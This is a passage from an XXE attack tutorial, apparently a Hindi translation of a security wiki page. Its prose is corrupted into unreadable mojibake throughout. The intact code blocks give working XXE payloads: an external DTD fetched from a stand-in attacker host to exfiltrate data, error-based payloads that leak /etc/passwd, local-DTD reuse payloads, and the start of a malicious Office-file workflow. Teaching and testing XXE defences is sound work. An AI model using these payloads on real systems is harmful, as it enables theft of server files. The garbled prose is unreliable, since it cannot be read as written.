* `exfiltrate` рдирд╛рдордХ рдПрдХ рдФрд░ XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ рдХрд╛ рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рд╡рд╛рд▓рд╛ рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ `eval` рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред `exfiltrate` рдЗрдХрд╛рдИ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди URL рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ `file` рдЗрдХрд╛рдИ рдХреЗ рдореВрд▓реНрдп рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ HTTP рдЕрдиреБрд░реЛрдз рдмрдирд╛рдХрд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
* `eval` рдЗрдХрд╛рдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ `exfiltrate` рдЗрдХрд╛рдИ рдХреА рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рдХреА рдЬрд╛рддреА рд╣реИред
* `exfiltrate` рдЗрдХрд╛рдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддрд╛рдХрд┐ рдЗрд╕рдХрд╛ рдореВрд▓реНрдп рдирд┐рд░реНрджрд┐рд╖реНрдЯ URL рдкрд░ рдЕрдиреБрд░реЛрдз рдХрд░рдХреЗ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдлрд┐рд░ рдЙрд╕ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DTD рдХреЛ рд╣реЛрд╕реНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕реЗ рд╡реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЖрдорддреМрд░ рдкрд░ рдЗрд╕реЗ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рд╡реЗрдмрд╕рд░реНрд╡рд░ рдкрд░ рд▓реЛрдб рдХрд░рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд URL рдкрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DTD рдХреЛ рд╕реЗрд╡рд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:\
`http://web-attacker.com/malicious.dtd`

рдЕрдВрдд рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд XXE рдкреЗрд▓реЛрдб рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### рдПрд░рд░ рдЖрдзрд╛рд░рд┐рдд (рдмрд╛рд╣рд░реА DTD)

**рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣рдо рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DTD рд▓реЛрдб рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рдПрд░рд░ рд╕рдВрджреЗрд╢ рдореЗрдВ рджрд┐рдЦрд╛рдПрдЧрд╛ (рдпрд╣ рдХреЗрд╡рд▓ рддрдм рдорд╛рдиреНрдп рд╣реИ рдЬрдм рдЖрдк рдПрд░рд░ рд╕рдВрджреЗрд╢ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ).** [**рдпрд╣рд╛рдБ рд╕реЗ рдЙрджрд╛рд╣рд░рдг.**](https://portswigger.net/web-security/xxe/blind)

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдмрд╛рд╣рд░реА DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `/etc/passwd` рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдпреБрдХреНрдд рдПрдХ XML рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдПрд░рд░ рд╕рдВрджреЗрд╢ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
рдпрд╣ DTD рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХреЛ рдЕрдВрдЬрд╛рдо рджреЗрддрд╛ рд╣реИ:

* рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ `file` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `/etc/passwd` рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╣реЛрддреА рд╣реИред
* рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ `eval` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдФрд░ XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ рдХрд╛ рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕реЗ `error` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред `error` рдЗрдХрд╛рдИ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдлрд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо `file` рдЗрдХрд╛рдИ рдХреЗ рдореВрд▓реНрдп рдХреЛ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред
* `eval` рдЗрдХрд╛рдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ `error` рдЗрдХрд╛рдИ рдХреА рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рдХреА рдЬрд╛рддреА рд╣реИред
* `error` рдЗрдХрд╛рдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддрд╛рдХрд┐ рдЗрд╕рдХрд╛ рдореВрд▓реНрдп рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдлрд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдХреЗ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдлрд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ `/etc/passwd` рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╣реИред

рдмрд╛рд╣рд░реА DTD рддреНрд░реБрдЯрд┐ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкреБрдХрд╛рд░реЗрдВ:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
рдФрд░ рдЖрдкрдХреЛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдореЗрдВ рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рджрд┐рдЦрдиреА рдЪрд╛рд╣рд┐рдПред

![](<../.gitbook/assets/image (223) (1).png>)

_**рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдмрд╛рд╣рд░реА DTD рд╣рдореЗрдВ рдПрдХ рдЗрдХрд╛рдИ рдХреЛ рджреВрд╕рд░реЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (****`eval`****), рд▓реЗрдХрд┐рди рдпрд╣ рдЖрдВрддрд░рд┐рдХ DTD рдореЗрдВ рдирд┐рд╖рд┐рджреНрдз рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЖрдорддреМрд░ рдкрд░ рдмрд╛рд╣рд░реА DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдЖрдк рддреНрд░реБрдЯрд┐ рдХреЛ рдордЬрдмреВрд░ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред**_

### **рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд (рд╕рд┐рд╕реНрдЯрдо DTD)**

рддреЛ рдЬрдм **рдмрд╛рд╣рд░реА рд╕рдВрдкрд░реНрдХ рдЕрд╡рд░реБрджреНрдз рд╣реЛрддреЗ рд╣реИрдВ** (рдмрд╛рд╣рд░реА рдХрдиреЗрдХреНрд╢рди рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИрдВ) рддреЛ рдЕрдВрдзрд╛ XXE рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛? [рдпрд╣рд╛рдБ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА](https://portswigger.net/web-security/xxe/blind).

рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдпреБрдХреНрдд рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдирд╛** рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, XML рднрд╛рд╖рд╛ рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рдПрдХ рдЫреЗрдж рдХреЗ рдХрд╛рд░рдгред рдпрджрд┐ рдХрд┐рд╕реА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ **DTD рдЖрдВрддрд░рд┐рдХ рдФрд░ рдмрд╛рд╣рд░реА DTD** рдШреЛрд╖рдгрд╛рдУрдВ рдХрд╛ рдорд┐рд╢реНрд░рдг рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдЖрдВрддрд░рд┐рдХ DTD рдмрд╛рд╣рд░реА DTD рдореЗрдВ рдШреЛрд╖рд┐рдд рдЗрдХрд╛рдЗрдпреЛрдВ рдХреЛ рдкреБрдирд░реНрдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдЬрдм рдпрд╣ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдПрдХ рдЕрдиреНрдп рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЗ рднреАрддрд░ рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд╢рд┐рдерд┐рд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдЖрдВрддрд░рд┐рдХ DTD рдХреЗ рднреАрддрд░ рд╕реЗ рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд XXE рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдмрд╢рд░реНрддреЗ XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ рдЬреЛ рд╡реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ **рдмрд╛рд╣рд░реА DTD рдХреЗ рднреАрддрд░ рдШреЛрд╖рд┐рдд рдПрдХ рдЗрдХрд╛рдИ рдХреЛ рдкреБрдирд░реНрдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд░рд╣реА рд╣реЛ**ред рдмреЗрд╢рдХ, рдпрджрд┐ рдмрд╛рд╣рд░реА рд╕рдВрдкрд░реНрдХ рдЕрд╡рд░реБрджреНрдз рд╣реИрдВ, рддреЛ рдмрд╛рд╣рд░реА DTD рдХреЛ рджреВрд░рд╕реНрде рд╕реНрдерд╛рди рд╕реЗ рд▓реЛрдб рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдпрд╣ рдПрдХ **рдмрд╛рд╣рд░реА DTD рдлрд╛рдЗрд▓ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕рд░реНрд╡рд░ рдХреЗ рд╕реНрдерд╛рдиреАрдп рд╣реЛ**ред _рдореВрд▓ рд░реВрдк рд╕реЗ, рд╣рдорд▓рд╛ рд╕реНрдерд╛рдиреАрдп рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдореМрдЬреВрдж рдПрдХ DTD рдлрд╛рдЗрд▓ рдХреЛ рдЖрд╣реНрд╡рд╛рди рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдпреБрдХреНрдд рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдореМрдЬреВрджрд╛ рдЗрдХрд╛рдИ рдХреЛ рдкреБрдирд░реНрдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреБрди: рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИред_

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рд╕рд░реНрд╡рд░ рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдкрд░ `/usr/local/app/schema.dtd` рд╕реНрдерд╛рди рдкрд░ рдПрдХ DTD рдлрд╛рдЗрд▓ рд╣реИ, рдФрд░ рдЗрд╕ DTD рдлрд╛рдЗрд▓ рдореЗрдВ `custom_entity` рдирд╛рдордХ рдПрдХ рдЗрдХрд╛рдИ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреА рдЧрдИ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕реЗ рдорд┐рд╢реНрд░рд┐рдд DTD рдХреЛ рдкреНрд░рд╕реНрддреБрдд рдХрд░рдХреЗ `/etc/passwd` рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдпреБрдХреНрдд рдПрдХ XML рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
рдпрд╣ DTD рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХреЛ рдЕрдВрдЬрд╛рдо рджреЗрддрд╛ рд╣реИ:

* XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ рдХреЛ `local_dtd` рдХреЗ рд░реВрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕рд░реНрд╡рд░ рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдореМрдЬреВрдж рдмрд╛рд╣рд░реА DTD рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╣реЛрддреА рд╣реИред
* XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ `custom_entity` рдХреЛ рдкреБрдирдГ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдмрд╛рд╣рд░реА DTD рдлрд╛рдЗрд▓ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╣реИред рдЗрдХрд╛рдИ рдХреЛ `/etc/passwd` рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдпреБрдХреНрдд рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ рд╡рд░реНрдгрд┐рдд [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) рдХреЗ рд░реВрдк рдореЗрдВ рдкреБрдирдГ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* `local_dtd` рдЗрдХрд╛рдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддрд╛рдХрд┐ рдмрд╛рд╣рд░реА DTD рдХреА рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рдореЗрдВ `custom_entity` рдЗрдХрд╛рдИ рдХреЗ рдкреБрдирдГ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдореВрд▓реНрдп рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рд╡рд╛рдВрдЫрд┐рдд рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред

**рд╡рд╛рд╕реНрддрд╡рд┐рдХ рджреБрдирд┐рдпрд╛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:** GNOME рдбреЗрд╕реНрдХрдЯреЙрдк рд╡рд╛рддрд╛рд╡рд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдореЗрдВ рдЕрдХреНрд╕рд░ `/usr/share/yelp/dtd/docbookx.dtd` рдкрд░ рдПрдХ DTD рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `ISOamso` рдирд╛рдордХ рдПрдХ рдЗрдХрд╛рдИ рд╣реЛрддреА рд╣реИред
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
```markdown
рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЖрдВрддрд░рд┐рдХ DTD** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рдПрдХ рдорд╛рдиреНрдп DTD рдЦреЛрдЬрдирд╛ рд╣реЛрдЧрд╛ред рдЖрдк рдпрд╣ рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ **OS / Software** рдХреЛ **рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдХреЗ** рдФрд░ рдХреБрдЫ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ DTDs рдХреА рдЦреЛрдЬ рдХрд░рдХреЗ**, рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ DTDs рдХреА рдПрдХ рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ** рдФрд░ **рдЬрд╛рдВрдЪ рдХрд░рдХреЗ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреЛрдИ рднреА рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ:
```
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
### рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ DTDs рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд╛рдирджрд╛рд░ github рд░реЗрдкреЛ рдореЗрдВ рдЖрдк **рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдореМрдЬреВрдж DTDs рдХреЗ рдкрде** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкреАрдбрд╝рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдХреА Docker рдЗрдореЗрдЬ** рд╣реИ, рддреЛ рдЖрдк рдЙрд╕реА рд░реЗрдкреЛ рдХреЗ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЗрдореЗрдЬ рдХреЛ рд╕реНрдХреИрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдореМрдЬреВрдж **DTDs рдХрд╛ рдкрде рдкрддрд╛** рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП [github рдХреА Readme](https://github.com/GoSecure/dtd-finder) рдкрдврд╝реЗрдВред
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Office Open XML рдкрд╛рд░реНрд╕рд░реНрд╕

(рдпрд╣рд╛рдБ рд╕реЗ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ [**рдпрд╣рд╛рдБ**](https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/))\
рдХрдИ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЖрдкрдХреЛ Microsoft Office рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдФрд░ рдлрд┐рд░ рд╡реЗ рдЙрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рд╡рд┐рд╡рд░рдг рдкрд╛рд░реНрд╕ рдХрд░рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ XLSX рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдПрдХ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рдЕрдкрд▓реЛрдб рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдХрд┐рд╕реА рдмрд┐рдВрджреБ рдкрд░, рдбреЗрдЯрд╛ рдХреЛ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рд╕реЗ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдкрд╛рд░реНрд╕рд░ рдХреЛ рдХрдо рд╕реЗ рдХрдо рдПрдХ XML рдлрд╛рдЗрд▓ **рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛** рд╣реЛрдЧреАред

рдЗрд╕рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ рдПрдХ **Microsoft Office рдлрд╛рдЗрд▓ рдЬрд┐рд╕рдореЗрдВ XXE рдкреЗрд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ** рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╣реИ, рддреЛ рдЪрд▓рд┐рдП рдпрд╣ рдХрд░рддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЕрдкрдиреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдЕрдирдЬрд╝рд┐рдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЦрд╛рд▓реА рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдмрдирд╛рдПрдВ, рдФрд░ рдЗрд╕реЗ рдЕрдирдЬрд╝рд┐рдк рдХрд░реЗрдВ!
```
test$ ls
test.docx
test$ mkdir unzipped
test$ unzip ./test.docx -d ./unzipped/
Archive:  ./test.docx
inflating: ./unzipped/word/numbering.xml
